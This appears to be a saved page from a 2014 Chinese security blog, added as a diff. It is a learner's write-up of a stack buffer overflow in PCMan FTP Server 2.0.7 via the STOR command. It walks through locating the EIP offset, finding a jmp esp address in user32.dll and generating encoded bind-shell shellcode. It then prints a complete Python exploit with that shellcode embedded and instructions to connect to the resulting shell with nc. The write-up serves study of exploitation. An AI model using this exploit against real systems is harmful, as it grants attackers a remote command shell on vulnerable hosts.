@@ -1,0 +1,391 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>PCMAN FTP STOR命令栈溢出 | 离别歌</title>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/styles.css" rel="stylesheet"/>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/style.css" rel="stylesheet"/>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./PCMAN FTP STOR命令栈溢出  离别歌/jquery.min.js"></script>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/code.css" rel="stylesheet"/>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/button.css" rel="stylesheet"/>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./PCMAN FTP STOR命令栈溢出  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/pcman-ftp-stor-exploit.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/pcman-ftp-stor-exploit.html&amp;text=PCMAN%20FTP%20STOR%E5%91%BD%E4%BB%A4%E6%A0%88%E6%BA%A2%E5%87%BA"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/pcman-ftp-stor-exploit.html&amp;title=PCMAN%20FTP%20STOR%E5%91%BD%E4%BB%A4%E6%A0%88%E6%BA%A2%E5%87%BA"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/pcman-ftp-stor-exploit.html&amp;is_video=false&amp;description=PCMAN%20FTP%20STOR%E5%91%BD%E4%BB%A4%E6%A0%88%E6%BA%A2%E5%87%BA"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=PCMAN%20FTP%20STOR%E5%91%BD%E4%BB%A4%E6%A0%88%E6%BA%A2%E5%87%BA&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/pcman-ftp-stor-exploit.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/pcman-ftp-stor-exploit.html&amp;title=PCMAN%20FTP%20STOR%E5%91%BD%E4%BB%A4%E6%A0%88%E6%BA%A2%E5%87%BA"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/pcman-ftp-stor-exploit.html&amp;title=PCMAN%20FTP%20STOR%E5%91%BD%E4%BB%A4%E6%A0%88%E6%BA%A2%E5%87%BA"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/pcman-ftp-stor-exploit.html&amp;title=PCMAN%20FTP%20STOR%E5%91%BD%E4%BB%A4%E6%A0%88%E6%BA%A2%E5%87%BA"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/pcman-ftp-stor-exploit.html&amp;title=PCMAN%20FTP%20STOR%E5%91%BD%E4%BB%A4%E6%A0%88%E6%BA%A2%E5%87%BA"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/pcman-ftp-stor-exploit.html&amp;name=PCMAN%20FTP%20STOR%E5%91%BD%E4%BB%A4%E6%A0%88%E6%BA%A2%E5%87%BA&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">PCMAN FTP STOR命令栈溢出</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年1月26日 15:06" itemprop="datePublished">
+                    2014 一月 26 15:06
+                </time>
+</div>
+<div class="article-tag">
+            阅读：3433
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/PENETRATION">网络安全</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E6%BA%A2%E5%87%BA">溢出</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+	    继XX同学上个学期对PCMAN FTP这个软件进行了残暴的溢出测试（溢出点是FTP用户名，版本不清楚），我也开始学习逆向和溢出，谷歌上搜索pcman's ftp，找到了这个溢出exploit：<a href="http://www.exploit-db.com/exploits/27703/" target="_blank">http://www.exploit-db.com/exploits/27703/</a> 。作为我初学exp的试验工具~~
+</p>
+<p>
+	    pcman's ftp是一款运行在windows下的FTP软件，最新版本2.0.7，也就是我今天要测试的版本。所以介绍相关信息：
+</p>
+<p>
+	    OS：windows XP sp3 简体中文版（WIN7下我也试过，但因为ASLR没能绕过去，重启以后就不能用了，放弃了）
+</p>
+<p>
+	    soft version：<a href="http://vbb.twftp.org/showthread.php?t=5794" target="_blank">2.0.7</a>
+</p>
+<p>
+	    shellcode：msfpayload windows/shell_bind_tcp LPORT=28876 R | msfencode -a x86 -b '\x00\xff\x0a\x0d\x20\x40' -t c
+</p>
+<p>
+	    point：pcman对stor命令长度判断存在缺陷，导致缓冲区溢出（在溢出字符串前加/../即可绕过）。但文中给出的exp不能正常使用，所以我们需要对其进行修改。
+</p>
+<p>
+	    
+</p>
+<p>
+	    <strong>0x01 定位eip</strong>
+</p>
+<p>
+	    栈溢出原理就是覆盖了栈的返回地址。因为栈是从高地址向低地址延伸的，所以当产生溢出的时候，我们写在低地址的内容超出缓冲区大小，从而覆盖了高地址的eip的值，导致溢出。
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201401/fac41390723952.jpg" id="ematt:355" target="_blank"><img alt="06.jpg" border="0" height="337" src="./PCMAN FTP STOR命令栈溢出  离别歌/thum-fac41390723952.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    如上图是函数的栈，我们能控制的就是buffer[128]，当我们输入的内容过长的时候，就能把后面的ebp、eip给覆盖掉。eip指向的是下一条待执行的语句地址，这样我们就能轻松执行自己的语句。
+</p>
+<p>
+	    所以第一步，我们需要知道buffer的长度是多少时才能覆盖到eip。
+</p>
+<p>
+	    <span>首先我们大概确定一下eip的位置。首先把expdb文章中给出的</span>exp保存下来，将覆盖之前的垃圾数据A长度设置成1900：
+</p>
+<p>
+	    garbage= '\x41' * 1900
+</p>
+<p>
+	    发送发现没有出错，说明溢出点在1900字节以后，再把garbage改成2100，发现程序崩掉了。所以我确定溢出长度在1900-2100字节之间。当然这个范围是慢慢确定的，比如先试1000-5000，再试1500-2500，慢慢缩小范围。
+</p>
+<p>
+	    确定了一个大范围以后，我们借助到metasploit中的一个小脚本来完成这个任务：/opt/metasploit/apps/pro/msf3/tools/pattern_create.rb
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201401/4efd1390740882.jpg" id="ematt:369" target="_blank"><img alt="01.jpg" border="0" height="35" src="./PCMAN FTP STOR命令栈溢出  离别歌/thum-4efd1390740882.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    生成一个长度是200的pattern字符串（2100-1900==200），我们发送这样的一个数据包：
+</p>
+<p>
+	    STOR + /../ + A * 1900 + pattern
+</p>
+<p>
+	    PCMAN接受到数据后就崩了，在windbg下可以看到此时的eip是0x41346441：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201401/3fb51390741827.jpg" id="ematt:371" target="_blank"><img alt="02.jpg" border="0" height="57" src="./PCMAN FTP STOR命令栈溢出  离别歌/thum-3fb51390741827.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    我们再回到kali下使用pattern_offset来计算偏移：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201401/f9961390741913.jpg" id="ematt:373" target="_blank"><img alt="03.jpg" border="0" height="24" src="./PCMAN FTP STOR命令栈溢出  离别歌/thum-f9961390741913.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    偏移是102，也就是说0x41346441这个值出现在了200个字符中的第102个，也就是eip在第102个。加上之前的1900，我们就精确计算出eip所在的位置：1900 + 102 == 2002.
+</p>
+<p>
+	    我们可以测试一下，发送 STOR + /../ + B * 2002 + A * 4，可以看到windbg获取的eip：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201401/fac41390743812.jpg" id="ematt:379" target="_blank"><img alt="06.jpg" border="0" height="211" src="./PCMAN FTP STOR命令栈溢出  离别歌/thum-fac41390743812.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    41414141即为AAAA。
+</p>
+<p>
+<br>
+</br></p>
+<p>
+	    <strong>0x02 查找jmp esp</strong>
+</p>
+<p>
+	    知道了eip的位置，我们就来构造eip的值。eip是指向下一个执行的语句的地址，那么我们就可以直接把shellcode放在这个地方来执行shellcode了吧！！
+</p>
+<p>
+	    不过现实情况是，我们并不知道shellcode应该放在什么位置。而且在每台计算机上固定的地址都可能不相同，所以绝不能使用jmp 0x0a45e807这种方式跳转到shellcode。但是我们可以跳到一个寄存器指向的地址，比如esp。
+</p>
+<p>
+	    具体溢出基础原理不再赘述，总之我们可以把eip覆盖成jmp esp的地址。有前辈找到了一个对于windowsXP和2003（中文版）都通用的地址：0x7ffa4512。不过有句老话，通用的一定不是最好的。我们何不学会怎么自己在内存里找到这种地址？
+</p>
+<p>
+	    用windbg的s指令。首先我知道jmp esp的机器码是ff e4。接着，我选择在USER32.DLL这个模块中搜索。当然，最好的方式是，我们在程序自带的dll中搜索，因为这些dll通常没有ASLD等防御措施。（不过这个软件自带的dll里没找到ff e4）
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201401/2de41390743229.jpg" id="ematt:375" target="_blank"><img alt="04.jpg" border="0" height="122" src="./PCMAN FTP STOR命令栈溢出  离别歌/thum-2de41390743229.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    从上图可以看到user32.dll加载在77d10000-77da0000之间，所以搜索可以这样：
+</p>
+<p>
+	    s 77d10000 l 90000 ff e4 （从0x77d10000开始偏移90000）
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201401/13501390743231.jpg" id="ematt:377" target="_blank"><img alt="05.jpg" border="0" height="175" src="./PCMAN FTP STOR命令栈溢出  离别歌/thum-13501390743231.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    如图可以找到很多ff e4.我们就选择最上面一个：0x77d29353.
+</p>
+<p>
+<br>
+</br></p>
+<p>
+	    <strong>0</strong><strong>x03 编写</strong><strong>合</strong><strong>适</strong><strong>的</strong><strong>s</strong><strong>hellcode</strong>
+</p>
+<p>
+	    这一步之前一直困扰我，之前编写用的一个shellcode一放进去就出错，后来用msfencode加工一遍以后就没问题了。以前只知道shellcode里不能有\x00，现在才知道某些特殊字符也不能有，比如这个ftp协议stor命令，就可能不能有\r、\n、空格，所以还是用msf生成一个正向连接的cmdshell。
+</p>
+<p>
+	    msfpayload windows/shell_bind_tcp LPORT=28876 R | msfencode -a x86 -b '\x00\xff\x0a\x0d\x20\x40' -t c
+</p>
+<p>
+	    
+</p>
+<p>
+	    <strong>0x04 改写原文中的exp</strong><strong>，溢出成功</strong>
+</p>
+<p>
+	    经过上面一长段分析，基本就可以开始编写exp了。原文中给出了exp，所以只要改写就行。（改偏移地址为2002，jmp esp地址为\x53\x93\xd2\x77，其他地方小改动）
+</p>
+<pre class="brush: python;auto-links: false;">import socket, sys, os, time
+if len(sys.argv) != 3:
+        print "[*] Uso: %s &lt;Ip Victima&gt; &lt;Puerto&gt; \n" % sys.argv[0]
+        print "[*] Exploit created by Polunchis"
+        print "[*] https://www.intrusionlabs.org"
+        sys.exit(0)
+target = sys.argv[1]
+port = int(sys.argv[2])
+#msfpayload windows/shell_bind_tcp LPORT=28876 R | msfencode -a x86 -b '\x00\xff\x0a\x0d\x20\x40' -t c
+shellcode = (
+"\xda\xcf\xb8\xba\xb3\x1e\xe7\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+"\x56\x31\x42\x18\x83\xc2\x04\x03\x42\xae\x51\xeb\x1b\x26\x1c"
+"\x14\xe4\xb6\x7f\x9c\x01\x87\xad\xfa\x42\xb5\x61\x88\x07\x35"
+"\x09\xdc\xb3\xce\x7f\xc9\xb4\x67\x35\x2f\xfa\x78\xfb\xef\x50"
+"\xba\x9d\x93\xaa\xee\x7d\xad\x64\xe3\x7c\xea\x99\x0b\x2c\xa3"
+"\xd6\xb9\xc1\xc0\xab\x01\xe3\x06\xa0\x39\x9b\x23\x77\xcd\x11"
+"\x2d\xa8\x7d\x2d\x65\x50\xf6\x69\x56\x61\xdb\x69\xaa\x28\x50"
+"\x59\x58\xab\xb0\x93\xa1\x9d\xfc\x78\x9c\x11\xf1\x81\xd8\x96"
+"\xe9\xf7\x12\xe5\x94\x0f\xe1\x97\x42\x85\xf4\x30\x01\x3d\xdd"
+"\xc1\xc6\xd8\x96\xce\xa3\xaf\xf1\xd2\x32\x63\x8a\xef\xbf\x82"
+"\x5d\x66\xfb\xa0\x79\x22\x58\xc8\xd8\x8e\x0f\xf5\x3b\x76\xf0"
+"\x53\x37\x95\xe5\xe2\x1a\xf2\xca\xd8\xa4\x02\x44\x6a\xd6\x30"
+"\xcb\xc0\x70\x79\x84\xce\x87\x7e\xbf\xb7\x18\x81\x3f\xc8\x31"
+"\x46\x6b\x98\x29\x6f\x13\x73\xaa\x90\xc6\xd4\xfa\x3e\xb8\x94"
+"\xaa\xfe\x68\x7d\xa1\xf0\x57\x9d\xca\xda\xee\x99\x04\x3e\xa3"
+"\x4d\x65\xc0\x33\x42\xe0\x26\xd9\x4a\xa5\xf1\x75\xa9\x92\xc9"
+"\xe2\xd2\xf0\x65\xbb\x44\x4c\x60\x7b\x6a\x4d\xa6\x28\xc7\xe5"
+"\x21\xba\x0b\x32\x53\xbd\x01\x12\x1a\x86\xc2\xe8\x72\x45\x72"
+"\xec\x5e\x3d\x17\x7f\x05\xbd\x5e\x9c\x92\xea\x37\x52\xeb\x7e"
+"\xaa\xcd\x45\x9c\x37\x8b\xae\x24\xec\x68\x30\xa5\x61\xd4\x16"
+"\xb5\xbf\xd5\x12\xe1\x6f\x80\xcc\x5f\xd6\x7a\xbf\x09\x80\xd1"
+"\x69\xdd\x55\x1a\xaa\x9b\x59\x77\x5c\x43\xeb\x2e\x19\x7c\xc4"
+"\xa6\xad\x05\x38\x57\x51\xdc\xf8\x67\x18\x7c\xa8\xef\xc5\x15"
+"\xe8\x6d\xf6\xc0\x2f\x88\x75\xe0\xcf\x6f\x65\x81\xca\x34\x21"
+"\x7a\xa7\x25\xc4\x7c\x14\x45\xcd"
+)
+garbage= '\x41' * 2002
+jmpesp = '\x53\x93\xd2\x77' #or 7ffa4512
+fixstack= '\x83\xc4\x9c'
+nop='\x90' * 4
+buffer = garbage + jmpesp + nop + fixstack + shellcode
+vulparameter= '/../'
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+print "[+] Connect to %s on port %d" % (target,port)
+try:
+    s.connect((target,port))
+    s.recv(1024)
+    s.send('USER anonymous\r\n') 
+    s.recv(1024)
+    s.send('PASS polunchis\r\n')
+    s.recv(1024)
+    s.send("STOR " + vulparameter + buffer + "\r\n")
+    print "[+] Sending payload of size", len(buffer) 
+    s.close()
+    print "[+] Exploit Sent Successfully"
+    print "[+] Waiting for 5 sec before spawning shell to " + target + ":28876\r"
+    print "\r"
+    time.sleep(5)
+    #os.system ("nc -n " + target + " 28876")
+    print "[+] Then you can test nc.exe -n " + target + " 28876 \r"
+except:
+    print "[-] Could not connect to " + target + ":21\r"
+    sys.exit(0) </pre>
+    发送成功：
+<p>
+<br/>
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201401/e4bd1390746143.jpg" id="ematt:381" target="_blank"><img alt="07.jpg" border="0" height="111" src="./PCMAN FTP STOR命令栈溢出  离别歌/thum-e4bd1390746143.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    因为是正向连接cmdshell，所以用nc连接一下成功：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201401/86c31390746145.jpg" id="ematt:383" target="_blank"><img alt="08.jpg" border="0" height="320" src="./PCMAN FTP STOR命令栈溢出  离别歌/thum-86c31390746145.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    发送的数据中有一个fixstack字段，机器码的意思是add esp, ffffffc4，也就是esp = esp - 100H。我问了学长，是为了提高栈，避免shellcode中局部变量把代码破坏了……其实具体原理还是不太懂，以后再细细研究~
+</p>
+<p>
+	    
+</p>
+<p>
+	    对PCMAN FTP的研究到一段落了，但溢出的冰山一角才开始出现在我眼前，再接再厉。
+</p>
+<p>
+	    PCMAN FTP下载，在附件中。
+</p>
+<p>
+	    附件：<span class="attachment"><a href="https://www.leavesongs.com/content/uploadfile/201401/98791390746831.rar" target="_blank">PCMans_FTP_Server_2.0.rar</a></span>
+</p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="d0b2cf46b88a8893e2bab7516481b994220cb282"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./PCMAN FTP STOR命令栈溢出  离别歌/d0b2cf46b88a8893e2bab7516481b994220cb282"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="298">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="EAagbwXOFfzC3CQKqeDX38IqzvK5d6GtcUvMZ09362t13heZev7HCMKvIzddWAvD"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./PCMAN FTP STOR命令栈溢出  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./PCMAN FTP STOR命令栈溢出  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
